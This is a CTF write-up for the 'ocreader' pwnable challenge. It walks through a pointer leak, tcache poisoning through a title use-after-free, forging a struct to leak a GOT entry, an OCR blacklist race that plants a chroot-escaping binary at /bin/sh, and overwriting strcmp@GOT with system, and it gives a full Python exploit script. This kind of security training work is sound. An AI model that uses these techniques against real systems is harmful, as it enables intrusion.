---
title: "HyperSonic CTF 2026 ocreader Writeup"
description: "HyperSonic CTF 2026 ocreader writeup"
---

# ocreader

## Overview

`ocreader` is a pwnable challenge that uploads an image and then runs its OCR output as VM commands. The program manages up to `4` image slots, and each image is associated with a `title`, `description`, and `path`. Each line extracted by OCR is passed to the VM's `vm_execute_line`.

The conditions I confirmed are as follows.

- Category: `pwnable`
- Goal: Read the flag by abusing the OCR image management feature and the VM command processing flow.
- Main features: store image, run OCR, show info, edit title, delete title

The solution starts with the image slot structure and how VM commands are processed. On the menu side we can manipulate heap objects, and on the VM side the OCR output leads to filesystem commands. Connecting the two flows lets us overwrite the GOT and then call `system`.

## Challenge analysis

The structures and terms used here:

- `image`: the image slot object managed by the program.
- `title`: allocated with `malloc(0x20)`, stores the `32` bytes the user entered.
- `description`: the description buffer created by the VM's `ADDDESC` command.
- `path`: the uploaded image file path. The VM's `RENAME` command references it.
- `OCR cache`: a text file that stores the OCR result. If it already exists, the cache is read instead of re-running Tesseract.
- `blacklist`: a global string passed to `tessedit_char_blacklist` when Tesseract runs.

The image slot maps to the following struct.

```c
struct image {
    char *title;
    char *description;
    char *path;
};
```

`show info` prints `title` and `description` with `puts`. In particular, for `description` it prints `description + 8` rather than the start of the buffer. Running `ADDDESC` with an empty argument stores a pointer internal to the VM handler library at `description + 8`. As a result, `show info` leaks the lower bytes of that pointer directly.

```text
empty ADDDESC:
  *(description + 0x00) = 0
  *(description + 0x08) = lib_base + 0x40c0

show info:
  puts(description + 0x08)
```

The first leak value is computed as follows.

```text
lib_base = leaked_description_pointer - 0x40c0
```

The VM handler library's command table has the following four opcodes.

```text
RENAME
MKDIR
BLACKLIST
ADDDESC
```

`vm_execute_line` treats the part of an OCR line before the first space as the opcode, compares it against the table's opcode strings with `strcmp`, and then calls the matching handler.

```text
for each vm_opcode:
    if strcmp(command, vm_opcode) == 0:
        handler(context, image_index, argument)
```

Here `strcmp@GOT` lives in a writable region of the VM handler library. From the relocation info, the offsets of `puts@GOT` and `strcmp@GOT` are as follows.

```text
puts@GOT   = lib_base + 0x4010
strcmp@GOT = lib_base + 0x4040
```

So if we replace `strcmp@GOT` with `system`, the following call happens at the opcode comparison point.

```text
strcmp(command, vm_opcode)  ->  system(command)
```

However, the program runs inside a chroot. `system` internally runs `/bin/sh -c <command>`, so we first have to prepare a `/bin/sh` inside the chroot.

## Key idea

The overall flow of the attack splits into two stages.

The first is building a primitive close to an arbitrary write out of the menu features. `delete title` calls `free(image->title)` but does not clear the pointer. `edit title` then writes `32` bytes again without checking whether the pointer has already been freed. This lets us modify the tcache `fd` of a freed `title` chunk.

The second is preparing a `/bin/sh` inside the chroot through the OCR/VM path. The VM's `BLACKLIST` command changes the global OCR blacklist. Running it with an empty argument leaves the blacklist briefly empty before it reverts to the default `RNM` about `25` milliseconds later. If we make another image's first OCR succeed during this short window, `RENAME` and `MKDIR` get recognized correctly.

The primitives needed for the attack are as follows.

```text
1. Leak the VM handler library base with ADDDESC
2. Poison a tcache fd via title UAF
3. Build a forged image slot to leak puts@GOT
4. Use the OCR race to place the uploaded static binary at /bin/sh inside the chroot
5. Overwrite strcmp@GOT with system and call system at the VM opcode comparison point
```

Ordering also matters. If `strcmp@GOT` is overwritten too early, the VM can no longer process `BLACKLIST`, `MKDIR`, and `RENAME` as normal handlers. So the `/bin/sh` placement race has to finish first, and the GOT overwrite comes last.

## Solution

### Step 1. Leak the VM handler library base with `ADDDESC`

First upload an image whose OCR result contains the following two lines.

```text
BLACKLIST
ADDDESC
```

OCR-ing this image runs `ADDDESC` with an empty argument. As seen earlier, an empty `ADDDESC` stores a pointer internal to the library at `description + 8`. Calling `show info` afterward prints this pointer.

```text
lib_base = leak - 0x40c0
```

This value gives the GOT addresses of the VM handler library.

```text
puts_got   = lib_base + 0x4010
strcmp_got = lib_base + 0x4040
```

The OCR result of this step is also left in the cache. Later, when we re-run OCR after overwriting `strcmp@GOT`, Tesseract will not re-run, and the cached `BLACKLIST` line can be fed to the VM quickly.

### Step 2. Forge an `image` slot via title UAF

`delete title` frees the `title` pointer but does not set the slot's internal pointer to `NULL`. So calling `show info` on the same slot reads the contents of the freed chunk with `puts`, and calling `edit title` writes to the freed chunk again.

Freeing two `title` chunks in a row puts them into the `0x30` tcache bin. Printing the second freed `title` leaks the `fd` with safe-linking applied. In the heap layout I observed, the second `title` is `0x80` bytes after the first, so the address of the first `title` can be recovered using the following relation.

```text
encoded_fd = title0 ^ (title1 >> 12)
title1     = title0 + 0x80
```

After recovering `title0` by iteration, compute the address of the fourth image slot struct according to the observed layout.

```text
image3 = title0 - 0x250
poison = image3 ^ (title1 >> 12)
```

Using `edit title` to change the `fd` of the freed `title1` chunk to `poison` makes the next `malloc(0x20)` return an address overlapping the fourth image slot struct. At this point, use the `title` input to write the following structure, forging the image slot itself.

```python
fake_image3 = (
    p64(lib_base + 0x4040)      # title -> strcmp@GOT
    + p64(lib_base + 0x4010 - 8)  # description -> puts@GOT - 8
    + p64(0)                   # path
    + p64(0x51)                # following heap metadata
)
```

`description` is set to `puts@GOT - 8` because `show info` first dereferences `description` and then prints `description + 8`. Aligned this way, `description + 8` is exactly `puts@GOT`.

### Step 3. Compute the libc base from `puts@GOT`

Calling `show info` on the forged fourth slot prints the libc address stored in `puts@GOT`.

```text
libc_base = leaked_puts - 0x87be0
system    = libc_base + 0x58750
```

The fourth slot's `title` now points at `strcmp@GOT`. So calling `edit title` writes an arbitrary value to `strcmp@GOT`. But we do not write `system` yet. One more normal VM opcode handler run is still needed.

### Step 4. Prepare a `/bin/sh` inside the chroot via an OCR race

The program runs in a chroot environment. Even if `system` is called, reading the flag is hard without a usable `/bin/sh` inside the chroot. So we upload a separate static binary and move it to the `/bin/sh` location inside the chroot with VM commands.

The static binary's job is simple.

```text
1. Create a temp directory and chroot into it.
2. Move up to the parent directory several times.
3. Make the current location the chroot root again.
4. Read several candidate flag paths in order.
```

The OCR sentences needed to move the file to `/bin/sh` are as follows.

```text
MKDIR ../bin
RENAME 2 ../bin/sh
```

The problem is that the default OCR blacklist is `RNM`. OCR-ing the sentences above in that state can drop `R`, `N`, and `M`, breaking the opcode, and if a bad OCR result is cached, later retries also fail.

So we use the moment `BLACKLIST` runs with an empty argument. This command empties the global blacklist and holds it for about `25` milliseconds before restoring it to `RNM`. Relying on a single timing is unstable, so I ran the cached `BLACKLIST` image many times while also requesting the second image's first OCR many times.

```text
32 requests of the cached BLACKLIST OCR
64 requests of the second image's OCR
```

On success, the VM's `MKDIR` handler creates `/bin` inside the chroot, and the `RENAME` handler moves the uploaded static binary to the `/bin/sh` location. Only after this step can we overwrite `strcmp@GOT`.

### Step 5. Overwrite `strcmp@GOT` and trigger the VM opcode comparison point

Finally, edit the fourth slot's `title`. Since that pointer already points at `strcmp@GOT`, the `system` address entered is written straight into the GOT.

Then run a cached OCR image once more. `vm_execute_line` has to call `strcmp(command, vm_opcode)` for the opcode comparison, but because the GOT has been changed, the actual call becomes `system(command)`.

```text
command = "BLACKLIST"
system("BLACKLIST")
```

`system` runs `/bin/sh -c BLACKLIST`. Since the earlier step replaced the chroot's `/bin/sh` with the static binary, that binary runs, escapes the chroot, and reads the candidate flag paths.

## Exploit / Solver

The final exploit computes base addresses from the leaks, forges the fourth image slot via tcache poisoning, and then runs the OCR race and GOT overwrite in order. The code below is the core flow, excluding the connection and menu synchronization parts. Let `c` be a client object that performs store image, run OCR, show info, edit title, and delete title.

```python
import re
import struct
import time


LIB_DESC_PTR_OFF = 0x40C0
LIB_PUTS_GOT = 0x4010
LIB_STRCMP_GOT = 0x4040

LIBC_PUTS = 0x87BE0
LIBC_SYSTEM = 0x58750


def p64(x):
    return struct.pack("<Q", x)


def u64(data):
    return struct.unpack("<Q", data[:8].ljust(8, b"\x00"))[0]


def leak_after(out, marker, n=6):
    pos = out.index(marker) + len(marker)
    return u64(out[pos:pos + n])


def decode_title0(encoded):
    title0 = encoded
    for _ in range(8):
        title0 = encoded ^ ((title0 + 0x80) >> 12)
    return title0


def pipeline_ocr(c, idx, count):
    if not c.at_prompt:
        c.recvuntil(b"> ")
    c.send((f"2\n{idx}\n" * count).encode())
    c.at_prompt = False


def race_make_bin_sh(c):
    pipeline_ocr(c, 0, 32)
    pipeline_ocr(c, 1, 64)
    time.sleep(2.0)

    out = c.recv_some(timeout=0.5)
    c.at_prompt = True
    if b"image renamed" not in out:
        raise RuntimeError("OCR race failed")


def exploit(c, boot_png, stage_png, escape_elf):
    escape_elf += b"\x00"
    assert len(escape_elf) % 3 == 0

    c.store_image(boot_png, b"A" * 32)
    c.store_image(stage_png, b"B" * 32)

    c.ocr_image(0)
    c.wait_prompt(timeout=5.0)
    time.sleep(1.0)
    c.recv_some(timeout=0.2)
    c.at_prompt = True

    info0 = c.show_info(0)
    lib_base = leak_after(info0, b"description: ") - LIB_DESC_PTR_OFF

    c.delete_title(0)
    c.delete_title(1)

    info1 = c.show_info(1)
    encoded_fd = leak_after(info1, b"title: ")
    title0 = decode_title0(encoded_fd)
    title1 = title0 + 0x80
    image3 = title0 - 0x250

    c.edit_title(1, p64(image3 ^ (title1 >> 12)))

    c.store_image(escape_elf, b"C" * 32)

    fake_image3 = (
        p64(lib_base + LIB_STRCMP_GOT)
        + p64(lib_base + LIB_PUTS_GOT - 8)
        + p64(0)
        + p64(0x51)
    )
    c.store_image(b"ABC", fake_image3)

    info3 = c.show_info(3)
    libc_base = leak_after(info3, b"description: ") - LIBC_PUTS
    system = libc_base + LIBC_SYSTEM

    race_make_bin_sh(c)

    c.edit_title(3, p64(system))

    pipeline_ocr(c, 0, 1)
    time.sleep(1.0)
    out = c.recv_some(timeout=2.0)
    return re.search(rb"(?:flag|Hypersonic)\{[^}\r\n]+\}", out).group(0)
```

One thing to watch out for is the Base64 decoder. If the upload data length is not a multiple of `3`, `=` padding is added, and the provided decoder did not handle that reliably. So I appended a NUL byte after the static binary to fix the length.

## Result

I confirmed the flag in the remote run.

```text
Hypersonic{0cr_n3v3r_d13_1n_chr00t}
```
